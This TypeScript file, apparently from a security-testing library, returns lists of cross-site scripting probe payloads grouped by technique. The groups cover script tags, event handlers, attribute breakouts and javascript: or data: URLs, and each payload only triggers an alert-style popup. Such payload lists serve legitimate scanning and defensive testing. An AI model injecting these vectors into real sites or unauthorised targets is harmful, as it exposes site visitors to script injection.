/**
 * Basic XSS payload vectors.
 * @description Fundamental XSS attack patterns.
 */
export class BasicVector {
  /**
   * Get all basic vectors.
   * @description Returns all basic XSS payload collections.
   * @returns Array of basic XSS payload strings
   */
  static all(): string[] {
    return [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<iframe src="javascript:alert(1)">',
      '"><script>alert(1)</script>',
      '"><img src=x onerror=alert(1)>',
      '"><svg onload=alert(1)>',
      "'><script>alert(1)</script>",
      "'><img src=x onerror=alert(1)>",
      "'><svg onload=alert(1)>",
      '</script><script>alert(1)</script>',
      "';alert(1);//",
      "';alert(1);var x='",
      'javascript:alert(1)',
      '<script src=data:text/javascript,alert(1)></script>'
    ]
  }

  /**
   * Get HTML attribute vectors.
   * @description Payloads injected via HTML attributes.
   * @returns Array of attribute-based XSS strings
   */
  static attributes(): string[] {
    return [
      '"><img src=x onerror=alert(1)>',
      "'><img src=x onerror=alert(1)",
      '"><svg onload=alert(1)>',
      "'><svg onload=alert(1)",
      '"><iframe src="javascript:alert(1)">',
      "'><iframe src='javascript:alert(1)'>",
      '"><body onload=alert(1)>',
      "'><body onload=alert(1)",
      '"><input autofocus onfocus=alert(1)>',
      '"><details open ontoggle=alert(1)>'
    ]
  }

  /**
   * Get event handler vectors.
   * @description JavaScript event handler XSS payloads.
   * @returns Array of event handler strings
   */
  static eventHandlers(): string[] {
    return [
      'onclick="alert(1)"',
      'onmouseover="alert(1)"',
      'onload="alert(1)"',
      'onerror="alert(1)"',
      'onfocus="alert(1)"',
      'onblur="alert(1)"',
      'onchange="alert(1)"',
      'onsubmit="alert(1)"',
      'onkeydown="alert(1)"',
      'onkeyup="alert(1)"',
      'onmouseenter="alert(1)"',
      'onmouseleave="alert(1)"',
      'onanimationstart="alert(1)"',
      'onanimationend="alert(1)"',
      'onanimationiteration="alert(1)"',
      'onanimationcancel="alert(1)"',
      'onbeforematch="alert(1)"',
      'onbeforeprint="alert(1)"',
      'onafterprint="alert(1)"'
    ]
  }

  /**
   * Get script execution vectors.
   * @description Direct JavaScript execution payloads.
   * @returns Array of script-based XSS strings
   */
  static scriptBased(): string[] {
    return [
      '<script>alert(1)</script>',
      '<script>alert(String.fromCharCode(88,83,83))</script>',
      '<script>alert(/XSS/.source)</script>',
      '<script>alert(atob("WFNT"))</script>',
      '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
      '<script>setTimeout(function(){alert(1)},0)</script>',
      '<script>setInterval(function(){alert(1)},0)</script>',
      '<script>Function("alert(1)")()</script>',
      '<script>(function(){alert(1)})()</script>',
      '<script>!function(){alert(1)}()</script>',
      '<script>+function(){alert(1)}()</script>',
      '<script>-function(){alert(1)}()</script>',
      '<script>~function(){alert(1)}()</script>',
      '<script>void function(){alert(1)}()</script>',
      '<script>new Function("alert(1)")()'
    ]
  }

  /**
   * Get script tag vectors.
   * @description Classic script tag injection patterns.
   * @returns Array of script tag XSS strings
   */
  static scriptTags(): string[] {
    return [
      '<script>alert(1)</script>',
      '<script>confirm(1)</script>',
      '<script>prompt(1)</script>',
      '<script>alert(String.fromCharCode(88,83,83))</script>',
      '<script src="data:text/javascript,alert(1)"></script>',
      '</script><script>alert(1)</script>',
      '"><script>alert(1)</script>',
      "'><script>alert(1)</script>"
    ]
  }

  /**
   * Get URL-based vectors.
   * @description JavaScript and data protocol payloads.
   * @returns Array of URL-based XSS strings
   */
  static urlBased(): string[] {
    return [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
      'data:text/html,<img src=x onerror=alert(1)>',
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<iframe src=javascript:alert(1)>',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<select onfocus=alert(1) autofocus>',
      '<textarea onfocus=alert(1) autofocus>',
      '<keygen onfocus=alert(1) autofocus>',
      '<video><source onerror=alert(1)>',
      '<audio src=x onerror=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '<marquee onstart=alert(1)>',
      '<isindex action=javascript:alert(1) type=submit>',
      '<form><button formaction=javascript:alert(1)>X</button>',
      '<math><maction actiontype=statusline#http://example.com?x=1 onmouseover=alert(1)>CLICK</maction></math>'
    ]
  }
}
